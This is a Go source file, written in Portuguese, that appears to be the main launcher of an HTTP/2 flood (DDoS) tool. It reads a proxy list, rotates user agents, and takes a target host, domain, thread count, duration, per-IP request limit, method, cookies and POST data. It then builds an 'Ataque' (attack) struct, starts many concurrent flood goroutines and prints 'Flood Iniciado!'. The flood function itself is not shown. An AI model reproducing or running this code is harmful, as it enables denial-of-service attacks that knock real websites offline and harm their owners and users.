package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var UserAgents = make(map[int]string)
var ProxiesCarregadas = make(map[int]string)
var RsIP int
var SincronizarThreads sync.WaitGroup

var Sys System


func IniciarUserAgents() {
	for y, x := range Agents {
		UserAgents[y] = x
	}
}

func main() {
	IniciarUserAgents()
	rand.Seed(time.Now().UnixNano())
	kkbanido := Catar()
	if len(os.Args) < 8 {
		fmt.Println(len(os.Args))
		fmt.Println(kkbanido)
		return
	}

	var versaoHTTP string
	var Host string
	var HTTP_HOST string
	var limite int
	var lista string
	var threads int
	var modo string
	var tempo int
	var cookie interface{}
	var data interface{}
	fmt.Sprint(versaoHTTP)

	Argumentos := os.Args[1:]
	for _, x := range Argumentos {
		if strings.Contains(x, "versão=") {
			versaoHTTP = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "host=") {
			Host = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "dominio=") {
			HTTP_HOST = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "tempo=") {
			tempo, _ = strconv.Atoi(strings.Split(x, "=")[1])
		}else if strings.Contains(x, "limite=") {
			limite, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "lista=") {
			lista = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "threads=") {
			threads, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "modo=") {
			modo = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "cookie=") {
			cookie = strings.Split(x, "cookie=")[1]
		} else if strings.Contains(x, "data=") {
			data = strings.Split(x, "data=")[1]
		} else {
			if !strings.Contains(x, "cookie=") {
				cookie = nil
			} else if !strings.Contains(x, "data=") {
				data = nil
			}
			fmt.Println(kkbanido)
		}
	}
	//fmt.Println(HTTPVersion, Host, HTTP_HOST, limit, threads, mode, cookie, data, list)
	if cookie != nil {
		modo = "POST"
	}

	proxy, err := os.Open(lista)
	if err != nil {
		fmt.Println("Arquivo de proxy não existe!", err)
		return
	}
	defer proxy.Close()
	corpo, err := ioutil.ReadAll(proxy)
	if err != nil {
		fmt.Println("Não foi possível ver o arquivo da proxy!")
		return
	}

	analise := strings.ReplaceAll(string(corpo), "\r\n", "\n")
	prox := strings.Split(analise, "\n")
	for i, p := range prox {
		ProxiesCarregadas[i] = p
	}

	New := Ataque{
		Url: Host,
		Host: HTTP_HOST,
		AtaqueMetodo: modo,
		PostData: data,
		RequestPorIp: limite,
		Cookie: cookie,
	}
	Sys = System{
		Banner: kkbanido,
		HTTP2Timeout: 10000,
		Ataque: &New,
	}

	for x := 0; x < threads; x++ {
		go HTTP2(&SincronizarThreads)
		SincronizarThreads.Add(1)
	}
	SincronizarThreads.Wait()
	close(start)
	fmt.Println("Flood Iniciado!")
	time.Sleep(time.Duration(tempo)*time.Second)
}